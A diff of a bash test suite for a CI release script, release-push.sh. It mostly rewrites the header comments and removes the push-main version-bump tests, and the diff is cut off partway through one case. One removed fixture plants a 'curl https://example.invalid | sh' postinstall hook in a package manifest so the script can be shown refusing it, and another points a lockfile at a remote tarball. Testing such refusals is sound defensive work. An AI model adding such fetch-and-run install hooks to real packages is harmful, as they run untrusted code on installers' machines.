@@ -2,113 +2,98 @@
 # Tests for `release-push.sh version`, the one version step every build job
 # calls: the tag an earlier attempt pushed, the bump release-bump.sh computes
 # since the newest tag, the npm fallback for a first release, --expect and the
-# refusals; for `release-push.sh push-main`: the version-bump push through the
-# deploy key, its same-package race resolution (LEGION-75) and its re-run
-# cases; for `release-push.sh tagged`, which finds the tag an earlier attempt
-# pushed and refuses one whose name is not <prefix>X.Y.Z; for `release-push.sh
-# tag`, which commits the bump and tags it, pushing nothing; for
+# refusals; for `release-push.sh tagged`, which finds the tag an earlier
+# attempt pushed and refuses one whose name is not <prefix>X.Y.Z; for
+# `release-push.sh tag`, which makes the release tag on $GITHUB_SHA, commits
+# nothing and pushes nothing; for `release-push.sh pair-version`, which prints
+# a plugin's released version or its newest tag's and refuses a released
+# version that is not X.Y.Z; for
 # `release-push.sh release`, which makes a GitHub release carry the run's
-# assets; for `release-push.sh restart`, which leaves a lost version's commit
-# to a later unfinished run or starts a run for it, bounded, against a stub gh;
+# assets; for `release-push.sh release-section`, which writes one section into
+# a release's body, replacing the one that heading already holds and editing
+# nothing when the body already holds it; for `release-push.sh restart`, which
+# leaves a lost version's commit to a later unfinished run or starts a run for
+# it, bounded, against a stub gh;
 # for `release-push.sh push-tag`, which pushes a tag with the deploy
-# key; for `release-push.sh push-built`, which lands a changed build of the
-# Claude Envoy plugin on main through land_on_main, on main's tip when main
-# moved, starts a fresh run when a build input changed or main was rewritten,
-# lands nothing when main holds a newer build, and refuses a doctored one;
-# for `release-push.sh check-built`, which refuses
-# what push-built refuses without a checkout or a credential; for
-# `release-push.sh extract-built`, which replaces the checkout's two built
+# key;
+# for `release-push.sh check-built`, which refuses a build no release may
+# publish, without a checkout or a credential; for
+# `release-push.sh extract-built`, which replaces a checkout's two built
 # directories with a checked build and refuses a bad one untouched; for
 # `release-push.sh handed`, which checks the version and the files a build job
 # hands a publish job and prints the release tag; for `release-push.sh
-# no-credential`, the build job's tripwire; and for `release-push.sh
-# fold-plan`, `fold-orphans` and `push-fold`, the changelog fold.
+# no-credential`, the build job's tripwire; for `release-push.sh fold-notes`,
+# `fold-check` and `fold-orphans`, the changelog fragments; and for
+# release.yaml's worker_image_release step, which needs the checkout this
+# change gives its job.
 #
-# Each push-main case builds a bare origin holding one seed commit
-# (packages/pkg at 1.0.0, a bun.lock whose workspace entries hold packages/pkg
-# at 1.0.0 and packages/other at 2.0.0, plus a README) and two clones, a and b.
-# Clone a plays the release run whose bump commit already landed on main; clone
-# b plays the next run of the same package, whose checkout predates that bump —
-# so b's push is rejected and its rebase meets a's change on the same "version"
-# lines of the manifest and the lockfile. In the re-run cases, b plays a later
-# attempt of a's run or of an older run; in the refusal cases, b's HEAD carries
-# a branch commit beside the bump, a bump that changes a second file, a
-# manifest-only commit that changes more than the version (on main's tip, or on
-# an older main commit, before any rebase), a bump that leaves the lockfile's
-# entry behind or changes more of the lockfile than that entry's version line,
-# or a merge commit over main's tip — or is a root commit with no parent — each
-# of which push-main refuses before any push. A
-# pre-receive hook that always rejects forces the exhaustion case. push-main
-# reaches origin as push-tag does: through the deploy key, with the GitHub URL
-# rewritten to the local origin by GIT_CONFIG_*, so the key directory is all
-# the script makes, and a recording hook sees what it held during the push.
-# The `tagged` cases build the commits and tags release runs leave in clone a
-# and read them from several checkouts. The `version` cases build the same on
-# another origin and run the version step from each checkout, with a stub `npm`
-# first on PATH for the first-release fallback. The `tag` cases rewrite the
-# manifest and run `tag` against an origin that must end up without the tag.
-# The publish-job case runs `tag`, `push-tag` and `push-main` for two packages
+# The `tagged`, `version` and `tag` cases each build a bare origin holding one
+# seed commit (packages/pkg at 1.0.0, a bun.lock whose workspace entries hold
+# packages/pkg at 1.0.0 and packages/other at 2.0.0, plus a README) and two
+# clones, a and b. The `tagged` cases put the tags release runs leave on that
+# commit, on a descendant of it and on a child that changes the manifest and
+# the lockfile alone, and read them from several checkouts; only a tag on the
+# checkout itself is its release. The `version` cases run the version step
+# from each checkout, with a stub `npm` first on PATH for the first-release
+# fallback, and read what `tag` leaves for a re-run and for the next commit.
+# The `tag` cases run it with $GITHUB_SHA naming the clone's HEAD and check
+# that the tag names that commit and nothing else moves: no commit is added,
+# the manifests and the lockfile keep their blobs, the work tree stays clean
+# and origin ends without the tag. A tag already on that commit, one another
+# clone pushed for it since the checkout, one on another commit, a version
+# that is not X.Y.Z and a $GITHUB_SHA that is not 40 lower-case hex are each
+# checked too. The publish-job case runs `tag` and `push-tag` for two packages
 # from one clone, as release.yaml's publish job does, each from the run's
-# commit, then a re-run of them, and the same re-run without the detach
-# between the packages.
+# commit, then a re-run of both, with no commit added to either clone and
+# origin's main left where it was. The pair-version cases run over a
+# repository whose manifest holds an older version than its newest tag: a
+# released version wins, a released version that is not X.Y.Z is refused
+# rather than falling through, a package that released nothing takes its
+# newest tag, and a newest tag that is no release prints nothing.
 # The `release` cases run against a stub `gh` first on PATH, which answers `gh
 # release view` for a release that does not exist, is a draft or is published,
 # can fail an upload, an edit or a create, and logs every call it gets. The
+# `release-section` cases drive that stub too: it answers `gh release view
+# --json body` with the body each case leaves it and keeps what an edit's
+# --notes-file held, so each case reads the body release-section would write,
+# byte for byte, over bodies holding that section nowhere, in the middle, at
+# the end, before another heading and already as it would be written, and over
+# a content or a heading it must refuse. The
 # `push-tag` cases push to a local bare origin through a URL rewrite, and two
 # more reach github.com itself: one with the pinned host keys, one with a copy
 # of the script whose pinned key GitHub does not hold. Those, and a comparison
 # of the pinned keys with `gh api meta`, print a SKIP line and count nothing
-# when the network or a gh sign-in is missing. The `push-built` cases seed a
-# bare origin's main with the real build input list, a source file of the
-# plugin, an excluded changelog and the plugin's built files under
-# packages/claude-envoy/dist and legion, check out its tip detached as the
-# push job does, and run push-built on a tar each case makes (`tar -cf … -C
-# <tree> dist legion`) from a tree it may doctor, reaching origin through the
-# deploy key and the URL rewrite and starting runs through the restart cases'
-# stub gh. A changed build lands as one commit on the base, by
-# github-actions[bot], with the skip keyword; an identical one pushes nothing.
-# With main moved past the base by commits that touch no build input (an empty
-# commit, docs, a changelog the list excludes), it lands as one commit on the
-# moved tip, changing only dist/ and legion/, and starts no run; moved by a
-# build input (a source file, a rename out of the plugin, a rename inside it,
-# the list itself) or with no list at the base (a ::warning), it lands and
-# starts one `gh workflow run claude-envoy-rebuild.yaml`, and a failed one
-# exits 1 saying the build landed. Main already holding github-actions[bot]'s
-# rebuild of a newer commit, or a person's commit under the rebuild subject,
-# lands nothing and starts nothing; a rebuild of the base itself with the same
-# bytes pushes nothing. Run from packages/claude-envoy instead of the
-# checkout's root, it refuses main's newer build all the same, and lands a tar
-# named relative to that subdirectory. Main rewritten past the base lands
-# nothing and starts one run. A `git` wrapper first on PATH lands a merge
-# between push-built's fetch and its push: nothing lands and land_on_main's one
-# run is the only one.
-# A push rejected while main's tip is still the base fails and starts nothing;
-# and no DEPLOY_KEY is refused before any push. A doctored tar is refused with
-# main moved by a docs-only commit or by a build input, before any fetch. Each
-# refusal — a symlink, a hard link,
-# a `..`, an absolute path, a member outside dist/ and legion/ or with another
-# character, an executable member, a missing bundle, manifest or agent, a base
-# that is not 40 lower-case hex, a HEAD not at the base, a dirty tree — leaves
-# origin, the clone and its work tree as they were. The landing cases and those
-# on a moved main also check nothing is left in TMPDIR. The `check-built` cases run
-# it on the good tar and on refused ones (an executable member, a skill script
-# among them, a symlink, a name with a space, a missing dist/dispatch.js) from
-# an empty directory outside any repository, and check it writes nothing there,
-# in TMPDIR or beside the tars. The `extract-built` case runs it from inside a
-# clone of such an origin, whose two directories carry a file the build lacks,
-# on a refused tar (nothing changes) and on a good one (the directories become
-# exactly the tar's files). The `handed` cases fill a directory with the
+# when the network or a gh sign-in is missing.
+# The `check-built` cases pack a tar as a build job packs it (`tar -cf … -C
+# <tree> dist legion`) from a tree each one may doctor, and run it from an
+# empty directory outside any repository with an empty TMPDIR, checking it
+# writes nothing there or beside the tars. Each refusal — a symlink, a hard
+# link, a `..`, an absolute path, a member outside dist/ and legion/ or with
+# another character, an executable member (a skill script among them), a
+# missing bundle, manifest or agent, a tar that is not there and a second
+# argument — is named. The `extract-built` case runs it from inside a checkout
+# whose two directories, which nothing tracks, carry a file the build lacks:
+# on a refused tar nothing changes, and on a good one the directories become
+# exactly the tar's files. The `handed` cases fill a directory with the
 # archives a release ships, change one thing as a compromised build job could,
 # and run `handed` on it. The `no-credential`
 # cases run it under `env -i` with a throwaway HOME, plant one credential at a
-# time, and check it is named but never shown. The `fold-plan` and `push-fold`
-# cases build one repository with released and unreleased packages, fragments
-# added before, between and after hand-made release tags of both shapes (a
-# bump-shaped tag on a child of the built commit, a listener-shaped tag on the
-# built commit itself, and a name off <prefix>X.Y.Z), committed near midnight
-# in zones other than UTC; push-fold runs on a copy of it per case, with notes
-# the test writes (no changie), against a bare origin through the deploy key
-# and the URL rewrite push-main uses, and a stub `gh` that logs each call.
+# time, and check it is named but never shown. The `fold-notes` cases build one
+# repository holding a released package, with fragments added before, between
+# and after hand-made release tags of both shapes (one on a child of the built
+# commit, one on the built commit itself, and a name off <prefix>X.Y.Z), and
+# check it out at each release's own commit, as that release's build job has
+# it: each release renders the entries its own commits added and no others, a
+# release whose commits a lower tag already holds renders no file, and a
+# fragment renamed with git mv or named with a glob character keeps the release
+# that first shipped it. Stdout holds the `notes=` line alone, which each build
+# job appends to $GITHUB_OUTPUT. An entry that is no .yaml file is refused by
+# name, by fold-notes and `fold-check` alike, and `fold-check` with no changie
+# on PATH refuses once, naming the tool. The `fold-check` cases render the
+# shipped packages/pi-legion/.changie.yaml's own fragments and a kind it does
+# not list, which it names with what changie said. The cases that render print
+# a SKIP line where changie is not on PATH; the refusals above need none, and
+# run with a stub changie that fails if anything reaches it.
 #
 # Run from anywhere: .github/scripts/release-push.test.sh
 # CI runs it in ci.yaml's test job.
@@ -119,8 +104,8 @@ set -euo pipefail
 export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
 # Nor may the Oh My Pi session it runs in, if any: CI runs it in no session,
 # and a session's tools act on the variables that name one (a commit made with
-# OMP_SESSION_ID set can carry a session trailer, which push-fold's check of the
-# commit's exact message would read as part of the message).
+# OMP_SESSION_ID set can carry a session trailer, which a test reading a
+# commit's exact subject would read as part of the message).
 unset OMP_SESSION_ID PI_SESSION_FILE
 
 script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
@@ -137,10 +122,7 @@ identity() {
 }
 
 # seed_lock <file>: a bun.lock as `bun install` writes one, with a workspace
-# entry for packages/other at 2.0.0 and packages/pkg at 1.0.0. Beside them
-# stand the decoys a textual update must leave alone: packages/pkg-ui, whose
-# key starts with packages/pkg's, a dependency named "version" nested in pkg's
-# entry, and a "packages" section naming pkg.
+# entry for packages/other at 2.0.0 and packages/pkg at 1.0.0.
 seed_lock() {
   cat > "$1" <<'LOCK'
 {
@@ -157,17 +139,7 @@ seed_lock() {
     "packages/pkg": {
       "name": "pkg",
       "version": "1.0.0",
-      "dependencies": {
-        "version": "1.0.0",
-      },
     },
-    "packages/pkg-ui": {
-      "name": "pkg-ui",
-      "version": "1.0.0",
-    },
-  },
-  "packages": {
-    "pkg": ["pkg@workspace:packages/pkg"],
   }
 }
 LOCK
@@ -192,42 +164,6 @@ setup() {
   identity "$dir/b"
 }
 
-# set_version <clone> <version> [<package-dir>]: rewrite the manifest's .version
-# with jq, as the workflow's "Set release version" step does; <package-dir>
-# defaults to packages/pkg.
-set_version() {
-  local manifest=$1/${3:-packages/pkg}/package.json
-  jq --arg v "$2" '.version = $v' "$manifest" > "$1/tmp.json" \
-    && mv "$1/tmp.json" "$manifest"
-}
-
-# set_lock_version <clone> <version> [<package-dir>]: rewrite the version line
-# of bun.lock's workspace entry for <package-dir> (packages/pkg by default), as
-# `release-push.sh tag` does, with sed over the entry's lines.
-set_lock_version() {
-  local entry=${3:-packages/pkg}
-  sed -i "/^    \"${entry//\//\\/}\": {\$/,/^    },\$/ s/^      \"version\": \"[^\"]*\",\$/      \"version\": \"$2\",/" "$1/bun.lock"
-}
-
-# lock_version <repo> <rev> [<package-dir>]: the version line's value of
-# bun.lock's workspace entry for <package-dir> (packages/pkg by default) at
-# <rev>.
-lock_version() {
-  git -C "$1" show "$2:bun.lock" |
-    awk -v entry="    \"${3:-packages/pkg}\": {" '$0 == entry { inside = 1; next } inside && /^    },$/ { inside = 0 } inside && /^      "version"/ { split($0, f, "\""); print f[4] }'
-}
-
-# bump <clone> <version>: what the workflow's "Set release version" step and
-# `release-push.sh tag` do together — rewrite .version and bun.lock's entry and
-# commit both (together with anything the case already staged).
-bump() {
-  local clone=$1 v=$2
-  set_version "$clone" "$v"
-  set_lock_version "$clone" "$v"
-  git -C "$clone" add packages/pkg/package.json bun.lock
-  git -C "$clone" commit -q -m "chore: release pkg v$v [skip ci]"
-}
-
 # change <clone> <path> <subject>: a commit with <subject> that appends a line
 # to <path>, creating it as needed.
 change() {
@@ -238,8 +174,8 @@ change() {
   git -C "$clone" commit -q -m "$subject"
 }
 
-# The deploy key push-main and push-tag push with. The script under test writes
-# it under TMPDIR; each case gives it a fresh one and checks it is left empty.
+# The deploy key push-tag pushes with. The script under test writes it under
+# TMPDIR; each case gives it a fresh one and checks it is left empty.
 ssh-keygen -q -t ed25519 -N '' -C release-push-test -f "$work/deploy"
 
 # record_hook <origin.git>: a pre-receive hook that records what TMPDIR held
@@ -282,18 +218,9 @@ deploy_run() {
   left=$(find "$dir/tmp" -mindepth 1 | wc -l)
 }
 
-# push_main <clone> <version> [summary-file] [VAR=value...]: deploy_run's
-# `push-main packages/pkg <version>`, with the job summary in <summary-file>.
-push_main() {
-  local clone=$1 v=$2 summary=${3:-}
-  shift 2
-  [ $# -eq 0 ] || shift
-  deploy_run "$clone" GITHUB_STEP_SUMMARY="$summary" "$@" -- push-main packages/pkg "$v"
-}
-
-# tagged <clone> <tag-prefix> [<package-dir>]: runs the script under test's
-# `tagged` from <clone>; leaves its exit code in rc, its stdout (the tag the
-# version step reads) in out and its stderr in err.
+# tagged <clone> <tag-prefix>: runs the script under test's `tagged` from
+# <clone>; leaves its exit code in rc, its stdout (the tag the version step
+# reads) in out and its stderr in err.
 tagged() {
   local clone=$1
   shift
@@ -304,544 +231,68 @@ tagged() {
   err=$(<"$work/tagged.err")
 }
 
-origin_version() { git -C "$1/origin.git" show main:packages/pkg/package.json | jq -r .version; }
-origin_tip_subject() { git -C "$1/origin.git" log -1 --format=%s main; }
-release_commits() { git -C "$1/origin.git" log --format=%s main | { grep -c '^chore: release' || true; }; }
-not_rebasing() { [ ! -d "$1/.git/rebase-merge" ] && [ ! -d "$1/.git/rebase-apply" ] && echo true || echo false; }
-
-echo "Case 1: two releases of one package race on the version line of the manifest and the lockfile"
-setup "$work/c1"
-# a's bump also changes another key of the manifest and the line beside the
-# lockfile entry's version line, so the resolution must keep main's copy of
-# each file (HEAD at the rebase stop), not just replay b's version lines.
-jq '.description = "set on main by a"' "$work/c1/a/packages/pkg/package.json" > "$work/c1/a/tmp.json" \
-  && mv "$work/c1/a/tmp.json" "$work/c1/a/packages/pkg/package.json"
-sed -i 's/^      "name": "pkg",$/      "name": "pkg-set-on-main",/' "$work/c1/a/bun.lock"
-git -C "$work/c1/a" add bun.lock
-bump "$work/c1/a" 1.0.1
-git -C "$work/c1/a" push -q origin main
-bump "$work/c1/b" 1.0.2
-push_main "$work/c1/b" 1.0.2
-check "push-main exits 0" "$(is "$rc" 0)"
-check "origin/main holds the higher version" "$(is "$(origin_version "$work/c1")" 1.0.2)"
-check "origin/main keeps main's other change to the manifest" "$(is "$(git -C "$work/c1/origin.git" show main:packages/pkg/package.json | jq -r .description)" "set on main by a")"
-check "origin/main's lockfile entry holds the higher version" "$(is "$(lock_version "$work/c1/origin.git" main)" 1.0.2)"
-check "origin/main's lockfile keeps main's other change beside the version line" \
-  "$(is "$(git -C "$work/c1/origin.git" show main:bun.lock | grep -c '^      "name": "pkg-set-on-main",$')" 1)"
-check "origin/main's lockfile is a's with only the version line changed" \
-  "$(is "$(git -C "$work/c1/origin.git" diff --numstat main~1 main -- bun.lock)" "1	1	bun.lock")"
-check "origin/main has one bump commit per release" "$(is "$(release_commits "$work/c1")" 2)"
-check "the rebased bump commit keeps its message" "$(is "$(origin_tip_subject "$work/c1")" "chore: release pkg v1.0.2 [skip ci]")"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c1/b")"
-
-echo
-echo "Case 2: a HEAD carrying a commit besides the bump is refused before any push"
-# A workflow_dispatch from a branch checks out that branch; its commits must
-# not reach main through the deploy key.
-setup "$work/c2"
-record_hook "$work/c2/origin.git"
-change "$work/c2/b" README.md "feat: on the branch"
-bump "$work/c2/b" 1.0.1
-push_main "$work/c2/b" 1.0.1 "$work/c2/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error counts the commits HEAD carries over main" "$(contains "$out" '^::error::HEAD carries 2 commits main does not')"
-check "error lists each commit, short sha and subject" "$(contains "$out" '^::error::HEAD carries 2 commits main does not .* [0-9a-f]* chore: release pkg v1\.0\.1 \[skip ci\]; [0-9a-f]* feat: on the branch .* and push-main pushes the one version-bump commit')"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2/summary.md" 2>/dev/null)" 'HEAD carries 2 commits main does not.*feat: on the branch.*The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2")" 1.0.0)"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2")" seed)"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c2/b")"
-
-echo
-echo "Case 2b: a bump commit that changes a second file is refused before any push"
-setup "$work/c2b"
-record_hook "$work/c2b/origin.git"
-printf 'from b\n' > "$work/c2b/b/README.md"
-git -C "$work/c2b/b" add README.md
-bump "$work/c2b/b" 1.0.1
-push_main "$work/c2b/b" 1.0.1
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error names the paths the one commit changes" "$(contains "$out" '^::error::HEAD carries 1 commit main does not .* chore: release pkg v1\.0\.1 \[skip ci\] .* which changes README\.md bun\.lock packages/pkg/package\.json, and push-main pushes the one version-bump commit, which changes only packages/pkg/package\.json and bun\.lock,')"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2b")" 1.0.0)"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2b")" seed)"
-
-echo
-echo "Case 2c: a manifest-only commit at the release version that carries more than the version is refused"
-# A branch whose one commit over main's tip already holds the release version:
-# "Set release version" changes nothing, `tag` commits nothing, and that commit
-# is what push-main sees as the bump. Whatever else the file carries must not
-# land, and must not be shown.
-setup "$work/c2c"
-record_hook "$work/c2c/origin.git"
-jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2c/b/packages/pkg/package.json" > "$work/c2c/b/tmp.json" \
-  && mv "$work/c2c/b/tmp.json" "$work/c2c/b/packages/pkg/package.json"
-git -C "$work/c2c/b" add packages/pkg/package.json
-git -C "$work/c2c/b" commit -q -m "feat: a release the author bumped"
-push_main "$work/c2c/b" 1.0.1 "$work/c2c/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2c/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
-check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2c")" 1.0.0)"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2c")" seed)"
-
-echo
-echo "Case 2d: a commit at the release version that changes nothing but the version lands"
-# The exact bump, authored on the branch under the author's own subject: what a
-# run from main would land, so parity lets it through.
-setup "$work/c2d"
-record_hook "$work/c2d/origin.git"
-set_version "$work/c2d/b" 1.0.1
-set_lock_version "$work/c2d/b" 1.0.1
-git -C "$work/c2d/b" add packages/pkg/package.json bun.lock
-git -C "$work/c2d/b" commit -q -m "feat: a release the author bumped"
-push_main "$work/c2d/b" 1.0.1
-check "push-main exits 0" "$(is "$rc" 0)"
-check "origin/main holds the version" "$(is "$(origin_version "$work/c2d")" 1.0.1)"
-check "origin/main's lockfile entry holds the version" "$(is "$(lock_version "$work/c2d/origin.git" main)" 1.0.1)"
-check "origin/main's tip is the author's commit" "$(is "$(origin_tip_subject "$work/c2d")" "feat: a release the author bumped")"
-check "the push went through the deploy key" "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
-
-echo
-echo "Case 2h: a bump that leaves the lockfile's entry behind is refused before any push"
-# What a bump commit changing the manifest alone was before the lockfile took
-# the version: every later `bun install` rewrites the entry's line.
-setup "$work/c2h"
-record_hook "$work/c2h/origin.git"
-set_version "$work/c2h/b" 1.0.1
-git -C "$work/c2h/b" add packages/pkg/package.json
-git -C "$work/c2h/b" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
-push_main "$work/c2h/b" 1.0.1 "$work/c2h/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says the lockfile differs from its parent's in more than the entry's version line" \
-  "$(contains "$out" "^::error::HEAD's bun\.lock differs from its parent's in more than the version line of the workspace entry \"packages/pkg\" = 1\.0\.1\. push-main pushes the one version-bump commit")"
-check "job summary says the same and that the release itself succeeded" \
-  "$(contains "$(cat "$work/c2h/summary.md" 2>/dev/null)" "HEAD's bun\.lock differs.*The release itself succeeded")"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2h")" seed)"
-
-echo
-echo "Case 2i: a bump whose lockfile changes more than the entry's version line is refused before any push"
-# Each a change the version alone does not explain: another entry's version
-# line (a decoy whose key starts with the package's), a dependency of the entry,
-# a lockfile without the entry at all.
-for doctor in pkg-ui dependency resolution; do
-  setup "$work/c2i-$doctor"
-  record_hook "$work/c2i-$doctor/origin.git"
-  clone="$work/c2i-$doctor/b"
-  set_version "$clone" 1.0.1
-  set_lock_version "$clone" 1.0.1
-  case $doctor in
-    pkg-ui) set_lock_version "$clone" 1.0.1 packages/pkg-ui ;;
-    dependency) sed -i 's/^        "version": "1\.0\.0",$/        "version": "6.6.6",/' "$clone/bun.lock" ;;
-    resolution) sed -i 's|"pkg@workspace:packages/pkg"|"pkg@https://example.invalid/pkg.tgz"|' "$clone/bun.lock" ;;
-  esac
-  git -C "$clone" add packages/pkg/package.json bun.lock
-  git -C "$clone" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
-  push_main "$clone" 1.0.1
-  check "$doctor: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-  check "$doctor: error says the lockfile differs from its parent's in more than the entry's version line" \
-    "$(contains "$out" "^::error::HEAD's bun\.lock differs from its parent's in more than the version line of the workspace entry \"packages/pkg\" = 1\.0\.1\.")"
-  check "$doctor: the output never shows the lockfile's content" "$(is "$(contains "$out" 'example\.invalid\|6\.6\.6')" false)"
-  check "$doctor: nothing was pushed" "$(is "$seen" "")"
-  check "$doctor: origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2i-$doctor")" seed)"
-done
-# The parent's lockfile holds no entry for the package: no bump can be checked.
-setup "$work/c2i-none"
-clone="$work/c2i-none/a"
-sed -i 's|^    "packages/pkg": {$|    "packages/pkg-renamed": {|' "$clone/bun.lock"
-git -C "$clone" commit -q -am "chore: rename the entry"
-git -C "$clone" push -q origin main
-bump "$clone" 1.0.1
-push_main "$clone" 1.0.1
-check "no entry at the parent: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "no entry at the parent: error names the lockfile and the entry" \
-  "$(contains "$out" "^::error::bun\.lock at HEAD's parent [0-9a-f]* is missing or holds no workspace entry \"packages/pkg\" with one \"version\" line\.")"
-check "no entry at the parent: origin/main's tip is a's rename" "$(is "$(origin_tip_subject "$work/c2i-none")" "chore: rename the entry")"
-
-echo
-echo "Case 2j: a bump of the lockfile alone, the manifest already at the version, lands"
-# The drift the lockfile once carried: main's manifest at the release version,
-# its lockfile entry behind. "Set release version" changes nothing, `tag`
-# commits the lockfile's line alone, and push-main lands it.
-setup "$work/c2j"
-set_version "$work/c2j/a" 1.0.1
-git -C "$work/c2j/a" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-git -C "$work/c2j/a" push -q origin main
-git -C "$work/c2j/b" pull -q origin main
-record_hook "$work/c2j/origin.git"
-set_lock_version "$work/c2j/b" 1.0.1
-git -C "$work/c2j/b" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-push_main "$work/c2j/b" 1.0.1
-check "push-main exits 0" "$(is "$rc" 0)"
-check "origin/main's lockfile entry holds the version" "$(is "$(lock_version "$work/c2j/origin.git" main)" 1.0.1)"
-check "origin/main's tip changes the lockfile alone" "$(is "$(git -C "$work/c2j/origin.git" diff --name-only main~1 main)" bun.lock)"
-
-echo
-echo "Case 2k: a bump of the lockfile alone lands when main moves before its push"
-# The manifest already at the version, so only the lockfile's entry tells the
-# bump from nothing; an unrelated commit on main must not make push-main drop it.
-setup "$work/c2k"
-set_version "$work/c2k/a" 1.0.1
-git -C "$work/c2k/a" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-git -C "$work/c2k/a" push -q origin main
-git -C "$work/c2k/b" pull -q origin main
-set_lock_version "$work/c2k/b" 1.0.1
-git -C "$work/c2k/b" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-change "$work/c2k/a" src/guard.js "feat: guard"
-git -C "$work/c2k/a" push -q origin main
-push_main "$work/c2k/b" 1.0.1
-check "push-main exits 0" "$(is "$rc" 0)"
-check "no notice says the bump was not pushed" "$(is "$(contains "$out" '^::notice title=Version bump not pushed')" false)"
-check "origin/main's lockfile entry holds the version" "$(is "$(lock_version "$work/c2k/origin.git" main)" 1.0.1)"
-check "origin/main still holds main's own commit" "$(git -C "$work/c2k/origin.git" cat-file -e main:src/guard.js && echo true || echo false)"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c2k/b")"
-
-echo
-echo "Case 2e: a merge commit over main's tip is refused, even one carrying only the bump"
-# Its first parent is the seed, its second main's tip, its tree the seed's plus
-# the bump: one commit main does not have, changing only the manifest against
-# its first parent, whose push would fast-forward main back to the seed's tree.
-setup "$work/c2e"
-change "$work/c2e/a" src/guard.js "feat: guard"
-git -C "$work/c2e/a" push -q origin main
-record_hook "$work/c2e/origin.git"
-tip=$(git -C "$work/c2e/origin.git" rev-parse main)
-git -C "$work/c2e/b" fetch -q origin main
-# `ours` never fast-forwards; --no-commit leaves the merge open for the bump
-# (its "stopped before committing" note goes to stderr).
-git -C "$work/c2e/b" merge -s ours --no-commit FETCH_HEAD >/dev/null 2>&1
-set_version "$work/c2e/b" 1.0.1
-git -C "$work/c2e/b" add packages/pkg/package.json
-git -C "$work/c2e/b" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
-check "the merge commit's parents are the seed and main's tip" \
-  "$(is "$(git -C "$work/c2e/b" log -1 --format=%P HEAD)" "$(git -C "$work/c2e/origin.git" rev-parse main^) $tip")"
-check "the merge commit changes only the manifest against its first parent" \
-  "$(is "$(git -C "$work/c2e/b" diff --name-only HEAD^ HEAD)" packages/pkg/package.json)"
-push_main "$work/c2e/b" 1.0.1 "$work/c2e/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says HEAD has two parents" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 2 parents; the version-bump commit has one\. push-main pushes the one version-bump commit')"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2e/summary.md" 2>/dev/null)" 'has 2 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2e/origin.git" rev-parse main)" "$tip")"
-check "origin/main still holds the file the merge would have dropped" "$(git -C "$work/c2e/origin.git" cat-file -e main:src/guard.js && echo true || echo false)"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2e")" 1.0.0)"
-
-echo
-echo "Case 2f: a parentless HEAD is refused through the error sink"
-# A repository of one root commit holding the manifest at the release version:
-# it is one commit main does not have, and reading HEAD^ would die with git's
-# bare fatal, outside the ::error:: and the summary.
-setup "$work/c2f"
-record_hook "$work/c2f/origin.git"
-mkdir -p "$work/c2f/root/packages/pkg"
-git init -q -b main "$work/c2f/root"
-identity "$work/c2f/root"
-git -C "$work/c2f/root" remote add origin "$work/c2f/origin.git"
-printf '{\n  "name": "pkg",\n  "version": "1.0.1"\n}\n' > "$work/c2f/root/packages/pkg/package.json"
-git -C "$work/c2f/root" add -A
-git -C "$work/c2f/root" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
-push_main "$work/c2f/root" 1.0.1 "$work/c2f/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
